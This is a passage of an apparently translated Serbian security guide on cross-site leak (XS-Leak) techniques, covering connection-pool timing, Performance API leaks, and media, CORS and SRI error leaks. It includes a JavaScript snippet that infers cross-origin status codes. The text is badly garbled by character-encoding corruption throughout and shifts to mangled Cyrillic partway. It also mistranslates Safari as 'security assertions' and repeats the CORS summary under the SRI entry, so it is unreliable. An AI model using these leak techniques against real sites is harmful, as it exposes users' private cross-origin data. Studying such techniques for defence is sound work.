PregledaÄi koriste prikljuÄke za komunikaciju sa serverom, ali zbog ograniÄenih resursa operativnog sistema i hardvera, **pregledaÄi su primorani da nametnu ograniÄenje** na broj istovremenih prikljuÄaka. NapadaÄi mogu iskoristiti ovo ograniÄenje kroz sledeÄ‡e korake:

1. Utvrditi ograniÄenje prikljuÄaka pregledaÄa, na primer, 256 globalnih prikljuÄaka.
2. Zauzeti 255 prikljuÄaka tokom produÅ¾enog perioda pokretanjem 255 zahteva ka razliÄitim hostovima, dizajniranih da odrÅ¾e otvorene veze bez zavrÅ¡etka.
3. Koristiti 256. prikljuÄak da poÅ¡alje zahtev ka ciljnoj stranici.
4. PokuÅ¡ati 257. zahtev ka drugom hostu. S obzirom da su svi prikljuÄci zauzeti (kao Å¡to je navedeno u koracima 2 i 3), ovaj zahtev Ä‡e biti stavljen u red Äekanja dok prikljuÄak ne postane dostupan. KaÅ¡njenje pre nego Å¡to ovaj zahtev nastavi pruÅ¾a napadaÄu informacije o vremenu povezanom sa mreÅ¾nom aktivnoÅ¡Ä‡u vezanom za 256. prikljuÄak (prikljuÄak ciljne stranice). Ova zakljuÄivanja su moguÄ‡a jer su 255 prikljuÄaka iz koraka 2 i dalje zauzeti, Å¡to implicira da svaki novi dostupan prikljuÄak mora biti onaj osloboÄ‘en iz koraka 3. Vreme potrebno da 256. prikljuÄak postane dostupan direktno je povezano sa vremenom potrebnim za zavrÅ¡etak zahteva ka ciljnoj stranici.

Za viÅ¡e informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
## Tehnike API performansi

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) pruÅ¾a uvide u metrike performansi veb aplikacija, dodatno obogaÄ‡ene [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). Resource Timing API omoguÄ‡ava praÄ‡enje detaljnih vremena mreÅ¾nih zahteva, kao Å¡to su trajanje zahteva. Posebno, kada serveri ukljuÄe zaglavlje `Timing-Allow-Origin: *` u svojim odgovorima, dodatni podaci poput veliÄine prenosa i vremena pretrage domena postaju dostupni.

Ova obilje podataka moÅ¾e se dobiti putem metoda poput [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ili [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), pruÅ¾ajuÄ‡i sveobuhvatan pregled informacija povezanih s performansama. Dodatno, API olakÅ¡ava merenje vremena izvrÅ¡avanja raÄunanjem razlike izmeÄ‘u vremenskih oznaka dobijenih iz [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). MeÄ‘utim, vaÅ¾no je napomenuti da za odreÄ‘ene operacije u pregledaÄima poput Chrome-a, preciznost `performance.now()` moÅ¾e biti ograniÄena na milisekunde, Å¡to moÅ¾e uticati na granularnost merenja vremena.

Osim merenja vremena, Performance API moÅ¾e se iskoristiti za uvide povezane sa sigurnoÅ¡Ä‡u. Na primer, prisustvo ili odsustvo stranica u objektu `performance` u Chrome-u moÅ¾e ukazivati na primenu `X-Frame-Options`. Konkretno, ako je stranica blokirana od prikazivanja u okviru zbog `X-Frame-Options`, neÄ‡e biti zabeleÅ¾ena u objektu `performance`, pruÅ¾ajuÄ‡i suptilan trag o politikama uokvirivanja stranice.

### Curenje greÅ¡ke

* **Metode ukljuÄivanja**: Okviri, HTML elementi
* **Detektibilna razlika**: Kod statusa
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **SaÅ¾etak:** Zahtevi koji rezultiraju greÅ¡kama neÄ‡e kreirati unos vremena resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

MoguÄ‡e je **razlikovati izmeÄ‘u kodova statusa HTTP odgovora** jer zahtevi koji dovode do **greÅ¡ke** ne kreiraju **unos performansi**.

### GreÅ¡ka ponovnog uÄitavanja stila

* **Metode ukljuÄivanja**: HTML elementi
* **Detektibilna razlika**: Kod statusa
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **SaÅ¾etak:** Zbog greÅ¡ke u pregledaÄu, zahtevi koji rezultiraju greÅ¡kama se uÄitavaju dva puta.
* **Primer koda**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

U prethodnoj tehnici takoÄ‘e su identifikovana dva sluÄaja gde greÅ¡ke u pregledaÄu u GC dovode do **ponovnog uÄitavanja resursa kada ne uspeju da se uÄitaju**. To Ä‡e rezultirati viÅ¡estrukim unosima u Performance API i moÅ¾e se detektovati.

### GreÅ¡ka spajanja zahteva

* **Metode ukljuÄivanja**: HTML elementi
* **Detektibilna razlika**: Kod statusa
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **SaÅ¾etak:** Zahtevi koji rezultiraju greÅ¡kom ne mogu biti spojeni.
* **Primer koda**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Tehnika je pronaÄ‘ena u tabeli u pomenutom radu, ali nije pronaÄ‘en opis tehnike. MeÄ‘utim, moÅ¾ete pronaÄ‡i izvorni kod koji proverava to na [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Curenje prazne stranice

* **Metode ukljuÄivanja**: Okviri
* **Detektibilna razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **SaÅ¾etak:** Prazni odgovori ne kreiraju unose vremena resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

NapadaÄ moÅ¾e detektovati da li je zahtev rezultirao praznim telom HTTP odgovora jer **prazne stranice ne kreiraju unos performansi u nekim pregledaÄima**.

### **Curenje XSS-Auditora**

* **Metode ukljuÄivanja**: Okviri
* **Detektibilna razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **SaÅ¾etak:** KoriÅ¡Ä‡enjem XSS Auditora u Sigurnosnim tvrdnjama, napadaÄi mogu detektovati specifiÄne elemente veb stranica posmatrajuÄ‡i promene u odgovorima kada izraÄ‘eni payload-ovi pokrenu mehanizam filtriranja auditora.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

U Sigurnosnim tvrdnjama (SA), XSS Auditor, prvobitno namenjen spreÄavanju napada Cross-Site Scripting (XSS), paradoksalno moÅ¾e biti iskoriÅ¡Ä‡en za curenje osetljivih informacija. Iako je ova ugraÄ‘ena funkcija uklonjena iz Google Chrome-a (GC), joÅ¡ uvek je prisutna u SA. 2013. godine, Braun i Heiderich su demonstrirali da XSS Auditor moÅ¾e nenamerno blokirati legitimne skripte, dovodeÄ‡i do laÅ¾nih pozitiva. Na osnovu toga, istraÅ¾ivaÄi su razvili tehnike za izvlaÄenje informacija i detektovanje specifiÄnog sadrÅ¾aja na stranicama sa razliÄitim poreklom, koncept poznat kao XS-Leaks, inicijalno prijavljen od strane Terada i razraÄ‘en od strane Heyes-a u blog postu. Iako su ove tehnike bile specifiÄne za XSS Auditor u GC, otkriveno je da u SA, stranice blokirane od strane XSS Auditora ne generiÅ¡u unose u Performance API, otkrivajuÄ‡i metod putem kojeg osetljive informacije i dalje mogu biti curenje.

### Curenje X-Frame

* **Metode ukljuÄivanja**: Okviri
* **Detektibilna razlika**: Zaglavlje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **SaÅ¾etak:** Resurs sa zaglavljem X-Frame-Options ne kreira unos vremena resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Ako stranica **nije dozvoljena** da se **prikazuje** u **iframe-u**, neÄ‡e kreirati unos performansi. Kao rezultat, napadaÄ moÅ¾e detektovati zaglavlje odgovora **`X-Frame-Options`**.\
Isto se deÅ¡ava ako koristite **tag za ugradnju**. 

### Detekcija preuzimanja

* **Metode ukljuÄivanja**: Okviri
* **Detektibilna razlika**: Zaglavlje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **SaÅ¾etak:** Preuzimanja ne kreiraju unose vremena resursa u Performance API.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

SliÄno kao Å¡to je opisano za XS-Leak, **resurs koji se preuzima** zbog zaglavlja ContentDisposition, takoÄ‘e **ne kreira unos performansi**. Ova tehnika funkcioniÅ¡e u svim glavnim pregledaÄima.
### PoÄetak curenja preusmeravanja

* **Metode ukljuÄivanja**: Okviri
* **Detektibilna razlika**: Preusmeravanje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **SaÅ¾etak**: Unos vremena resursa otkriva poÄetno vreme preusmeravanja.
* **Primer koda**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

PronaÅ¡li smo jedan primer XS-Leak instance koji zloupotrebljava ponaÅ¡anje nekih pregledaÄa koji beleÅ¾e previÅ¡e informacija za zahteve sa razliÄitih izvora. Standard definiÅ¡e podskup atributa koji bi trebalo postaviti na nulu za resurse sa razliÄitih izvora. MeÄ‘utim, u **SA** je moguÄ‡e otkriti da li je korisnik **preusmeren** od strane ciljne stranice, upitivanjem **Performance API**-ja i proverom podataka o vremenu **redirectStart**.

### Curenje preusmeravanja trajanja

* **Metode ukljuÄivanja**: Fetch API
* **Detektibilna razlika**: Preusmeravanje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **SaÅ¾etak**: Trajanje unosa vremena je negativno kada se desi preusmeravanje.
* **Primer koda**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

U GC-u, **trajanje** za zahteve koji rezultiraju **preusmeravanjem** je **negativno** i moÅ¾e se stoga **razlikovati** od zahteva koji ne rezultiraju preusmeravanjem.

### CORP curenje

* **Metode ukljuÄivanja**: Okviri
* **Detektibilna razlika**: Zaglavlje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **SaÅ¾etak**: Resursi zaÅ¡tiÄ‡eni sa CORP-om ne stvaraju unose vremena resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

U nekim sluÄajevima, **nextHopProtocol unos** moÅ¾e se koristiti kao tehnika curenja. U GC-u, kada je postavljeno **CORP zaglavlje**, nextHopProtocol Ä‡e biti **prazan**. Imajte na umu da SA neÄ‡e kreirati unos performansi uopÅ¡te za resurse omoguÄ‡ene za CORP.

### Servisni radnik

* **Metode ukljuÄivanja**: Okviri
* **Detektibilna razlika**: KoriÅ¡Ä‡enje API-ja
* **ViÅ¡e informacija**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **SaÅ¾etak**: Otkrijte da li je servisni radnik registrovan za odreÄ‘eni izvor.
* **Primer koda**:

Servisni radnici su skriptni konteksti voÄ‘eni dogaÄ‘ajima koji se izvrÅ¡avaju na izvoru. Oni se izvrÅ¡avaju u pozadini web stranice i mogu presresti, izmeniti i **keÅ¡irati resurse** kako bi kreirali offline web aplikaciju.\
Ako je **resurs keÅ¡iran** od strane **servisnog radnika** pristupljen putem **iframe-a**, resurs Ä‡e biti **uÄitan iz keÅ¡a servisnog radnika**.\
Da biste otkrili da li je resurs **uÄitan iz keÅ¡a servisnog radnika**, moÅ¾e se koristiti **Performance API**.\
Ovo takoÄ‘e moÅ¾e biti uraÄ‘eno sa napadom na vreme (proverite rad za viÅ¡e informacija).

### KeÅ¡

* **Metode ukljuÄivanja**: Fetch API
* **Detektibilna razlika**: Vreme
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **SaÅ¾etak**: MoguÄ‡e je proveriti da li je resurs smeÅ¡ten u keÅ¡.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

KoriÅ¡Ä‡enjem [Performance API](./#performance-api) moguÄ‡e je proveriti da li je resurs keÅ¡iran.

### Trajanje mreÅ¾e

* **Metode ukljuÄivanja**: Fetch API
* **Detektibilna razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **SaÅ¾etak**: MoguÄ‡e je dobiti trajanje mreÅ¾e zahteva iz `performance` API-ja.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Tehnika poruka o greÅ¡kama

### GreÅ¡ka medija

* **Metode ukljuÄivanja**: HTML elementi (Video, Audio)
* **Detektibilna razlika**: Kod statusa
* **ViÅ¡e informacija**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **SaÅ¾etak**: U Firefox-u je moguÄ‡e taÄno procuriti statusni kod zahteva sa razliÄitih izvora.
* **Primer koda**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### `MediaError` Ğ¸Ğ½Ñ‚ĞµÑ€Ñ„ĞµÑ˜ÑĞ¾Ğ²Ğ° ÑĞ²Ğ¾Ñ˜ÑÑ‚Ğ²Ğ¾ Ğ¿Ğ¾Ñ€ÑƒĞºĞµ Ñ˜ĞµĞ´Ğ¸Ğ½ÑÑ‚Ğ²ĞµĞ½Ğ¾ Ğ¸Ğ´ĞµĞ½Ñ‚Ğ¸Ñ„Ğ¸ĞºÑƒÑ˜Ğµ Ñ€ĞµÑÑƒÑ€ÑĞµ ĞºĞ¾Ñ˜Ğ¸ ÑĞµ ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾ ÑƒÑ‡Ğ¸Ñ‚Ğ°Ğ²Ğ°Ñ˜Ñƒ ÑĞ° Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¸Ğ¼ Ğ½Ğ¸Ğ·Ğ¾Ğ¼. ĞĞ°Ğ¿Ğ°Ğ´Ğ°Ñ‡ Ğ¼Ğ¾Ğ¶Ğµ Ğ¸ÑĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸Ñ‚Ğ¸ Ğ¾Ğ²Ñƒ Ñ„ÑƒĞ½ĞºÑ†Ğ¸Ñ˜Ñƒ Ğ¿Ñ€Ğ°Ñ›ĞµÑšĞµĞ¼ ÑĞ°Ğ´Ñ€Ğ¶Ğ°Ñ˜Ğ° Ğ¿Ğ¾Ñ€ÑƒĞºĞµ, Ñ‡Ğ¸Ğ¼Ğµ Ğ¼Ğ¾Ğ¶Ğµ Ğ·Ğ°ĞºÑ™ÑƒÑ‡Ğ¸Ñ‚Ğ¸ ÑÑ‚Ğ°Ñ‚ÑƒÑ Ğ¾Ğ´Ğ³Ğ¾Ğ²Ğ¾Ñ€Ğ° Ğ½Ğ° Ñ€ĞµÑÑƒÑ€Ñ Ğ¸Ğ· Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ°.

### CORS Ğ“Ñ€ĞµÑˆĞºĞ°

* **ĞœĞµÑ‚Ğ¾Ğ´Ğµ ÑƒĞºÑ™ÑƒÑ‡Ğ¸Ğ²Ğ°ÑšĞ°**: Fetch API
* **Ğ”ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ğ° Ğ Ğ°Ğ·Ğ»Ğ¸ĞºĞ°**: Ğ—Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğµ
* **Ğ’Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ°**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Ğ ĞµĞ·Ğ¸Ğ¼Ğµ**: Ğ£ Ğ¸Ğ·Ñ˜Ğ°Ğ²Ğ°Ğ¼Ğ° Ğ¾ Ğ±ĞµĞ·Ğ±ĞµĞ´Ğ½Ğ¾ÑÑ‚Ğ¸ (SA), CORS Ğ¿Ğ¾Ñ€ÑƒĞºĞµ Ğ¾ Ğ³Ñ€ĞµÑˆĞºĞ°Ğ¼Ğ° Ğ½ĞµĞ½Ğ°Ğ¼ĞµÑ€Ğ½Ğ¾ Ğ¸Ğ·Ğ»Ğ°Ğ¶Ñƒ Ğ¿ÑƒĞ½Ñƒ URL Ğ°Ğ´Ñ€ĞµÑÑƒ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµĞ½Ğ¸Ñ… Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ°.
* **ĞŸÑ€Ğ¸Ğ¼ĞµÑ€ ĞšĞ¾Ğ´Ğ°**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

ĞĞ²Ğ° Ñ‚ĞµÑ…Ğ½Ğ¸ĞºĞ° Ğ¾Ğ¼Ğ¾Ğ³ÑƒÑ›Ğ°Ğ²Ğ° Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡Ñƒ Ğ´Ğ° **Ğ¸Ğ·Ğ²ÑƒÑ‡Ğµ Ğ¾Ğ´Ñ€ĞµĞ´Ğ¸ÑˆÑ‚Ğµ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞ° ÑĞ°Ñ˜Ñ‚Ğ° Ğ¸Ğ· Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ°** Ğ¸ÑĞºĞ¾Ñ€Ğ¸ÑˆÑ›Ğ°Ğ²Ğ°Ñ˜ÑƒÑ›Ğ¸ ĞºĞ°ĞºĞ¾ Ğ¿Ñ€ĞµĞ³Ğ»ĞµĞ´Ğ°Ñ‡Ğ¸ Ğ±Ğ°Ğ·Ğ¸Ñ€Ğ°Ğ½Ğ¸ Ğ½Ğ° Webkit-Ñƒ Ğ¾Ğ±Ñ€Ğ°Ñ’ÑƒÑ˜Ñƒ CORS Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğµ. ĞšĞ¾Ğ½ĞºÑ€ĞµÑ‚Ğ½Ğ¾, ĞºĞ°Ğ´Ğ° ÑĞµ **CORS-Ğ¾Ğ¼ Ğ¾Ğ¼Ğ¾Ğ³ÑƒÑ›ĞµĞ½Ğ¸ Ğ·Ğ°Ñ…Ñ‚ĞµĞ²** Ğ¿Ğ¾ÑˆĞ°Ñ™Ğµ Ğ½Ğ° Ñ†Ğ¸Ñ™Ğ½Ğ¸ ÑĞ°Ñ˜Ñ‚ ĞºĞ¾Ñ˜Ğ¸ Ğ¸Ğ·Ğ´Ğ° Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞµ Ğ½Ğ° Ğ¾ÑĞ½Ğ¾Ğ²Ñƒ ÑÑ‚Ğ°ÑšĞ° ĞºĞ¾Ñ€Ğ¸ÑĞ½Ğ¸ĞºĞ° Ğ¸ Ğ¿Ñ€ĞµĞ³Ğ»ĞµĞ´Ğ°Ñ‡ Ğ·Ğ°Ñ‚Ğ¸Ğ¼ Ğ¾Ğ´Ğ±Ğ¸Ñ˜Ğµ Ğ·Ğ°Ñ…Ñ‚ĞµĞ², **Ğ¿ÑƒĞ½Ğ° URL Ğ°Ğ´Ñ€ĞµÑĞ° Ñ†Ğ¸Ñ™Ğ° Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞ°** ÑĞµ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ° Ñƒ Ğ¿Ğ¾Ñ€ÑƒÑ†Ğ¸ Ğ¾ Ğ³Ñ€ĞµÑˆÑ†Ğ¸. ĞĞ²Ğ° ÑƒĞ³Ñ€Ğ¾Ğ¶ĞµĞ½Ğ¾ÑÑ‚ Ğ½Ğµ ÑĞ°Ğ¼Ğ¾ ÑˆÑ‚Ğ¾ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ° Ñ‡Ğ¸ÑšĞµĞ½Ğ¸Ñ†Ñƒ Ğ¾ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšÑƒ Ğ²ĞµÑ› Ñ‚Ğ°ĞºĞ¾Ñ’Ğµ Ğ¸Ğ·Ğ»Ğ°Ğ¶Ğµ ĞºÑ€Ğ°Ñ˜Ğ¸ÑˆÑ‚Ğµ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞ° Ğ¸ Ğ±Ğ¸Ğ»Ğ¾ **Ğ¾ÑĞµÑ‚Ñ™Ğ¸Ğ²Ğµ ÑƒĞ¿Ğ¸Ñ‚Ğµ Ğ¿Ğ°Ñ€Ğ°Ğ¼ĞµÑ‚Ñ€Ğµ** ĞºĞ¾Ñ˜Ğµ Ğ¼Ğ¾Ğ¶Ğµ ÑĞ°Ğ´Ñ€Ğ¶Ğ°Ñ‚Ğ¸.

### SRI Ğ“Ñ€ĞµÑˆĞºĞ°

* **ĞœĞµÑ‚Ğ¾Ğ´Ğµ ÑƒĞºÑ™ÑƒÑ‡Ğ¸Ğ²Ğ°ÑšĞ°**: Fetch API
* **Ğ”ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ğ° Ğ Ğ°Ğ·Ğ»Ğ¸ĞºĞ°**: Ğ—Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğµ
* **Ğ’Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ°**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Ğ ĞµĞ·Ğ¸Ğ¼Ğµ**: Ğ£ Ğ¸Ğ·Ñ˜Ğ°Ğ²Ğ°Ğ¼Ğ° Ğ¾ Ğ±ĞµĞ·Ğ±ĞµĞ´Ğ½Ğ¾ÑÑ‚Ğ¸ (SA), CORS Ğ¿Ğ¾Ñ€ÑƒĞºĞµ Ğ¾ Ğ³Ñ€ĞµÑˆĞºĞ°Ğ¼Ğ° Ğ½ĞµĞ½Ğ°Ğ¼ĞµÑ€Ğ½Ğ¾ Ğ¸Ğ·Ğ»Ğ°Ğ¶Ñƒ Ğ¿ÑƒĞ½Ñƒ URL Ğ°Ğ´Ñ€ĞµÑÑƒ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµĞ½Ğ¸Ñ… Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ°.
* **ĞŸÑ€Ğ¸Ğ¼ĞµÑ€ ĞšĞ¾Ğ´Ğ°**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

ĞĞ°Ğ¿Ğ°Ğ´Ğ°Ñ‡ Ğ¼Ğ¾Ğ¶Ğµ Ğ¸ÑĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸Ñ‚Ğ¸ **Ğ¾Ğ¿ÑˆĞ¸Ñ€Ğ½Ğµ Ğ¿Ğ¾Ñ€ÑƒĞºĞµ Ğ¾ Ğ³Ñ€ĞµÑˆĞºĞ°Ğ¼Ğ°** Ğ´Ğ° Ğ·Ğ°ĞºÑ™ÑƒÑ‡Ğ¸ Ğ²ĞµĞ»Ğ¸Ñ‡Ğ¸Ğ½Ñƒ Ğ¾Ğ´Ğ³Ğ¾Ğ²Ğ¾Ñ€Ğ° Ğ¸Ğ· Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ°. ĞĞ²Ğ¾ Ñ˜Ğµ Ğ¼Ğ¾Ğ³ÑƒÑ›Ğµ Ğ·Ğ±Ğ¾Ğ³ Ğ¼ĞµÑ…Ğ°Ğ½Ğ¸Ğ·Ğ¼Ğ° Ğ˜Ğ½Ñ‚ĞµĞ³Ñ€Ğ¸Ñ‚ĞµÑ‚Ğ° ĞŸĞ¾Ğ´Ñ€ĞµÑÑƒÑ€ÑĞ° (SRI), ĞºĞ¾Ñ˜Ğ¸ ĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸ Ğ°Ñ‚Ñ€Ğ¸Ğ±ÑƒÑ‚ Ğ¸Ğ½Ñ‚ĞµĞ³Ñ€Ğ¸Ñ‚ĞµÑ‚Ğ° Ğ´Ğ° Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€Ğ¸ Ğ´Ğ° Ğ»Ğ¸ ÑĞµ Ñ€ĞµÑÑƒÑ€ÑĞ¸ ĞºĞ¾Ñ˜Ğ¸ ÑĞµ ÑƒÑ‡Ğ¸Ñ‚Ğ°Ğ²Ğ°Ñ˜Ñƒ, Ñ‡ĞµÑÑ‚Ğ¾ ÑĞ° CDN-Ğ¾Ğ²Ğ°, Ğ½Ğ¸ÑÑƒ Ğ¼ĞµÑšĞ°Ğ½Ğ¸. Ğ”Ğ° Ğ±Ğ¸ SRI Ñ€Ğ°Ğ´Ğ¸Ğ¾ Ğ½Ğ° Ñ€ĞµÑÑƒÑ€ÑĞ¸Ğ¼Ğ° Ğ¸Ğ· Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ°, Ğ¾Ğ½Ğ¸ Ğ¼Ğ¾Ñ€Ğ°Ñ˜Ñƒ Ğ±Ğ¸Ñ‚Ğ¸ **CORS-Ğ¾Ğ¼ Ğ¾Ğ¼Ğ¾Ğ³ÑƒÑ›ĞµĞ½Ğ¸**; Ñƒ Ğ¿Ñ€Ğ¾Ñ‚Ğ¸Ğ²Ğ½Ğ¾Ğ¼, Ğ¾Ğ½Ğ¸ Ğ½Ğ¸ÑÑƒ Ğ¿Ñ€ĞµĞ´Ğ¼ĞµÑ‚ Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€Ğµ Ğ¸Ğ½Ñ‚ĞµĞ³Ñ€Ğ¸Ñ‚ĞµÑ‚Ğ°. Ğ£ Ğ¸Ğ·Ñ˜Ğ°Ğ²Ğ°Ğ¼Ğ° Ğ¾ Ğ±ĞµĞ·Ğ±ĞµĞ´Ğ½Ğ¾ÑÑ‚Ğ¸ (SA), ĞºĞ°Ğ¾ Ğ¸ Ñƒ CORS Ğ³Ñ€ĞµÑˆÑ†Ğ¸ XS-Leak, Ğ¿Ğ¾Ñ€ÑƒĞºĞ° Ğ¾ Ğ³Ñ€ĞµÑˆÑ†Ğ¸ Ğ¼Ğ¾Ğ¶Ğµ 